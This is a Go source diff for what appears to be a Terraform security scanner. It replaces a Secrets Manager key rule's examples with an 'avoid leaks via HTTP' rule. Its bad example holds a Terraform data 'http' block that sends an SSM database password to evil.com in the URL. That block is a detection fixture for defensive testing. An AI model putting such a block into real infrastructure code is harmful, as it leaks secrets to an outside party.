@@ -1,28 +1,30 @@
 package ssm
 
-var terraformSecretUseCustomerKeyGoodExamples = []string{
+var terraformAvoidLeaksViaHTTPGoodExamples = []string{
 	`
- resource "aws_kms_key" "secrets" {
- 	enable_key_rotation = true
- }
- 
- resource "aws_secretsmanager_secret" "good_example" {
-   name       = "lambda_password"
-   kms_key_id = aws_kms_key.secrets.arn
- }
+resource "aws_ssm_parameter" "db_password" {
+  name = "db_password"
+  type = "SecureString"
+  value = var.db_password
+}
+
  `,
 }
 
-var terraformSecretUseCustomerKeyBadExamples = []string{
+var terraformAvoidLeaksViaHTTPBadExamples = []string{
 	`
- resource "aws_secretsmanager_secret" "bad_example" {
-   name       = "lambda_password"
- }
+resource "aws_ssm_parameter" "db_password" {
+  name = "db_password"
+  type = "SecureString"
+  value = var.db_password
+}
+
+data "http" "not_exfiltrating_data_honest" {
+  url = "https://evil.com/?p=${aws_ssm_parameter.db_password.value}"
+}
  `,
 }
 
-var terraformSecretUseCustomerKeyLinks = []string{
-	`https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/secretsmanager_secret#kms_key_id`,
-}
+var terraformAvoidLeaksViaHTTPLinks []string
 
-var terraformSecretUseCustomerKeyRemediationMarkdown = ``
+var terraformAvoidLeaksViaHTTPRemediationMarkdown = ``
